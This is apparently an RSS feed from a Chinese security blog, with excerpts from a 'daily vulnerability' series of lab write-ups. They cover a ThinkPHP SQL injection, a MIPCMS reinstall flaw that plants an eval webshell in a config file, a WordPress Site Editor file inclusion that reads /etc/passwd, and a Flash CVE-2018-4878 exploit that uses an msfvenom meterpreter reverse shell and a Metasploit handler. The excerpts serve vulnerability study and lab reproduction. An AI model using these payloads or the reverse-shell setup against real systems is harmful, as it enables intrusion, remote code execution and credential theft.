<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>每日一洞 on F0rmat的博客 | 专注于网络攻防和信息安全</title>
    <link>https://getshe11.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E/</link>
    <description>Recent content in 每日一洞 on F0rmat的博客 | 专注于网络攻防和信息安全</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Wed, 11 Apr 2018 09:34:29 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析(每日一洞)</title>
      <link>https://getshe11.com/post/thinkphp-framework-_-5.0.16-sql-injection-vulnerability-analysis/</link>
      <pubDate>Wed, 11 Apr 2018 09:34:29 +0000</pubDate>
      
      <guid>https://getshe11.com/post/thinkphp-framework-_-5.0.16-sql-injection-vulnerability-analysis/</guid>
      <description>0x01 前言 前天在公众号看到石大神发的一篇审计thinkphp的文章,就想写一个分析流程，delay到了今天。昨天在先知也看到了chybeta发的一篇分析文章感觉也不错。分析过程，我也会做thinkphp部分功能的解析。 废话不多说，开始吧！
0x02 环境搭建和漏洞复现 程序下载地址：http://www.thinkphp.cn/down/1126.html PHPstudy：Apache+php5.6+MySQL 工具：PHPstorm
 首先建立一个数据库名为：thinkphp 建立一个表名为：user 添加三个字段：id,name,password   在thinkphp的数据库文件填上刚才我们建立的数据库信息： 文件位置：\thinkphp\application\database.php  打开thinkphp的调试模式： 文件位置：\thinkphp\application\config.php  简单写一个update功能，石大神用到了模型，这里就简单写一个例子就行了。 文件位置：\thinkphp\application\index\controller\Index.php  &amp;lt;?php namespace app\index\controller; class Index { public function index() { $password = input(&amp;#39;get.password/a&amp;#39;); db(&amp;#39;user&amp;#39;)-&amp;gt;where([&amp;#39;id&amp;#39;=&amp;gt; 1])-&amp;gt;update([&amp;#39;password&amp;#39;=&amp;gt;$password]); } } 这里用到了thinkphp的助手函数input()，是专用来接收get，post等的值。具体可以看：https://www.kancloud.cn/manual/thinkphp5/118044 还有就是thinkphp的数据库操作，框架本身写好了我们调用就比较方便。所以为什么那么多人用框架去开发程序，快捷而且安全，不过也会有安全问题，就像今天这个sql漏洞，不过如果是新手的话总比自己写的好对吧哈。 具体可以看链接：https://www.kancloud.cn/manual/thinkphp5/135178 7. 现在就可以访问我们的payload了：
http://thinkphp.test/thinkphp/public/index.php?password[0]=inc&amp;amp;password[1]=updatexml(2,concat(0x7e,user()),0)&amp;amp;password[2]=1 0x03 漏洞分析  这里用phpstorm+debug来动态分析，有不懂配置的可以访问我写一篇配置文章：利用phpstorm+xdebug进行断点调试 我们在主函数下一断点：   然后访问我们payload，它会跳到入口文件，我们只要分析的是sql执行的地方，所以我们直接F8跳到执行sql地方： 2. 我们继续跟进到loader.php它会包含thinkphp的Db.php文件， 接下还会包\thinkphp\library\think\db\connector\Mysql.php文件，主要是连接数据库的操作，这里就直接跳过了。别分析分析把自己绕进去了，我只是在这里讲诉下过程，我们还是直接分析sql执行的部分吧。 3. 我们跳到update执行的部分，文件位置：\thinkphp\library\think\db\Query.php 继续往下看，这句是执行我们sql的地方： 4. 我们F7跟进去，跳到文件位置\thinkphp\library\think\db\Builder.php parseTable函数直接F8往下执行了，这函数是处理table分析的，主要还是parseData函数,我们继续F7跟进 5. 我们继续往下跟进 我们看到了这里如果传入的值为数组形式的话，并且第一个参数为inc就执行switch所对应的的语句。 可以看到这里函数对我们传入的值没有做任何处理，返回内容仍然是我们的语句： 跟到后面返回的执行sql语句：
执行完，我们跟进到报错的地方，说明我的语句执行成功： 6.</description>
    </item>
    
    <item>
      <title>从用CentOS安装Docker靶场到Joomla 3.4.5 反序列化漏洞复现(每日一洞)</title>
      <link>https://getshe11.com/post/install-docker-from-centos-to-build-loopholes-to-joomla-3.4.5-replay-of-deserialization-loopholes/</link>
      <pubDate>Sat, 07 Apr 2018 09:02:12 +0000</pubDate>
      
      <guid>https://getshe11.com/post/install-docker-from-centos-to-build-loopholes-to-joomla-3.4.5-replay-of-deserialization-loopholes/</guid>
      <description>0x01 前言 最近天气突然变凉，导致我直接病倒在床，今天才缓过来。
上次的用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)讲的是Windows搭建，这次就以CentOS作为Dokcer的环境去搭建漏洞靶场，并以Joomla 3.4.5 反序列化漏洞复现(CVE-2015-8562)作为演示。
我本来还想写这个漏洞的分析，但是对于Joomla的比较大的程序，函数又多，要写一篇简单易懂的文章，篇幅会很长、很枯燥，我觉得还是不要造轮子了，直接去看P神的文章就行了Joomla远程代码执行漏洞分析（总结）。
话有点多了，估计是还没吃药哈。
0x02 安装Docker过程 1.安装所需的包 $ sudo yum install -y yum-utils \ device-mapper-persistent-data \ lvm2 2.添加Docker的源 $ sudo yum-config-manager \ --add-repo \ https://download.docker.com/linux/centos/docker-ce.repo 3.启用边缘和测试存储库 $ sudo yum-config-manager --enable docker-ce-edge $ sudo yum-config-manager --enable docker-ce-test  4.安装Docker $ sudo yum install docker-ce  5.验证是否正确安装 $ docker -v  6.使用国内的Docker加速器 不用加速器慢到要死，推荐使用。 注册一个阿里云的账号：https://cr.console.aliyun.com/#/accelerator
然后获取专属加速器地址： 输入以下命令：
sudo tee /etc/docker/daemon.json &amp;lt;&amp;lt;-&amp;#39;EOF&amp;#39; { &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://你的地址.mirror.aliyuncs.com&amp;#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker 7.</description>
    </item>
    
    <item>
      <title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</title>
      <link>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</link>
      <pubDate>Mon, 26 Mar 2018 01:09:26 +0000</pubDate>
      
      <guid>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</guid>
      <description>0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&amp;#39;,1=&amp;gt;eval(file_get_contents(&amp;#39;php://input&amp;#39;)),&amp;#39;2&amp;#39;=&amp;gt;&amp;#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&amp;quot;#{$key}#&amp;quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&amp;#39;Access-Control-Allow-Origin: *&amp;#39;); header(&amp;#39;Access-Control-Allow-Credentials: true&amp;#39;); header(&amp;#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&amp;#39;); header(&amp;#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&amp;#39;); if (Request::instance()-&amp;gt;isPost()) {//判断是否有post的数据  $dbconfig[&amp;#39;type&amp;#39;]=&amp;#34;mysql&amp;#34;;//定义数据库类型  $dbconfig[&amp;#39;hostname&amp;#39;]=input(&amp;#39;post.</description>
    </item>
    
    <item>
      <title>Wordpress Plugin Site Editor 1.1.1 - 本地文件包含漏洞分析(每日一洞)</title>
      <link>https://getshe11.com/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</link>
      <pubDate>Sun, 25 Mar 2018 13:45:14 +0000</pubDate>
      
      <guid>https://getshe11.com/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</guid>
      <description>0x01 前言 大概有一周没有写文章了，比赛完嗨皮了两天，喝酒喝到半夜回来继续看文章，看到了exploit的关于wordpress一个漏洞信息CVE-2018-7422 ，下面就来分析一下这个本地文件包含的漏洞代码，如果权限够的话是可以读取系统的一些敏感的文件例如:/etc/passwd、/etc/shadow等。
0x02 漏洞复现 环境 攻击机：Deepin Linux x64 Wordpress服务器：Windows 10 x64 (phpstudy) 搭建环境有些要注意的，例如上传插件是大于2M的，要php.ini里面修改下再重启下就行了。 Proof of Concept http://&amp;lt;host&amp;gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=要读取的文件绝对路径或者相对路径 结果 0x03 代码分析 文件在wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php 
你可以去插件的官方github看，前天的漏洞，现在还没修复 https://github.com/SiteEditor/editor/blob/master/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
这个漏洞代码比较简单容易，新手也很适合理解。 整合代码执行流程就是判断文件是否存在，存在就require_once包含，不存在就报错。 这里有一个点，为什么说是只能本地文件包含呢，不能用远程包含吗？如果远程文件包含不就可以利用php的协议来getshell了吗？ 因为file_exists函数只能判断本地文件，如果是远程文件的话就会判断文件不存在了。
if( isset( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) &amp;amp;&amp;amp; is_file( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) &amp;amp;&amp;amp; file_exists( $_REQUEST[&amp;#39;ajax_path&amp;#39;] ) ){ require_once $_REQUEST[&amp;#39;ajax_path&amp;#39;]; }else{ echo json_encode( array( &amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; &amp;#34;Error: didn&amp;#39;t load shortcodes pattern file&amp;#34;, ) ); return ; } 0x04 结束 再给我点时间，嗨皮过头了还没缓过神来，看过大表哥对我文章的评价，我会改进文章的一些细节，展现更好的给大家。
0x05 参考 插件源码下载：https://pan.</description>
    </item>
    
    <item>
      <title>Flash 0day漏洞(CVE-2018-4878)复现(每日一洞)</title>
      <link>https://getshe11.com/post/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</link>
      <pubDate>Tue, 13 Mar 2018 10:16:27 +0000</pubDate>
      
      <guid>https://getshe11.com/post/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</guid>
      <description>前言 这几天很忙，已经有两天没有更新文章了，最近CVE-2018-4878挺火的，还有群里的人也问这个怎么复现。今天就献丑复现一下，大表哥别喷，虽然我还没研究到这方面的漏洞分析，我会努力的，相信不久我也能写出二进制漏洞分析的文章。
 该漏洞影响 Flash Player 当前最新版本28.0.0.137以及之前的所有版本，而Adobe公司计划在当地时间2月5日紧急发布更新来修复此漏洞。从Adobe公告致谢来看，这个漏洞的野外攻击样本最早是由韩国计算机应急响应小组（KR-CERT）发现的，而KR-CERT也表示，来自朝鲜的黑客组织已经成功利用这个0Day 漏洞发起攻击。
 环境 攻击机： kali 2018 (192.168.59.6) 靶机： Windows 10 x64 (192.168.59.160) Web服务器： Windows 7 X64 (192.168.59.127)
复现过程  我们先在kali生成一个python类型的shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.59.6 LPORT=6666 -f p ython &amp;gt; /root/shellcode.txt   LHOST就是kali的ip地址，6666端口你可以随便设置，/root/shellcode.txt要生成的文件路径  替换EXP里面的shellcode  使用cve-2018-4878.py生成文件，我这里用的是Sublime Text 3 Ctrl+B运行python，会在本目录下生成两个文件index.html,exploit.swf  然后把这两个文件放到Web服务器里面  在kali的MSF里面设置监听  msf &amp;gt; use exploit/multi/handler msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &amp;gt; set LHOST 192.168.59.6 msf exploit(handler) &amp;gt; set LPORT 6666 msf exploit(handler) &amp;gt; exploit 然后使用靶机的win10 IE访问Web服务器的文件index.</description>
    </item>
    
  </channel>
</rss>
